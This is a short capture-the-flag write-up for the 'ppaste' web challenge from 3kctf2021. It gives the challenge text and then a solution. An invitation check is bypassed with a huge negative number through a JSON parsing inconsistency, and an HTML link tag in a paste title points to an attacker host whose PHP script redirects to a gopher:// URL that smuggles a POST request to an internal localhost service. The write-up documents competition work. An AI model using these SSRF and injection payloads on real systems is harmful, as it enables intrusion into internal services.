```
ppaste - 498pts - 1 solves - Author: rekter0

We've launched our first bugbounty program, Our triage team is eager to hear about your findings !

Bounty Program
https://app.intigriti.com/researcher/programs/ctf/3kctf2021/detail

Check assets in scope and whether you can leak a flag

Note:
- You need account at intigriti.com to view the scope
- Submit flag here to get CTF points
- Submit a report at intigriti gets you reputation points at intigriti


Hints
1. json inconsistencies

First Blood
1. Black Bauhinia
```

Bypass invitation, code -INF, ex: -3.3e333333333333
https://labs.bishopfox.com/tech-blog/an-exploration-of-json-interoperability-vulnerabilities

Create new paste
//title
```HTML
<linktype="text/css"href="http://MYHOST/redir.php">
```

//redir.php content
```PHP
<?php
header('location: gopher://localhost:8082/_POST%20%2Fusers%20HTTP%2F1.1%0AHost%3A%20localhost%0AContent-Length%3A%2021%0AContent-type%3A%20application%2Fjson%0A%0A%7B%22user%22%3A%22ewrwewrwe%22%7D');
```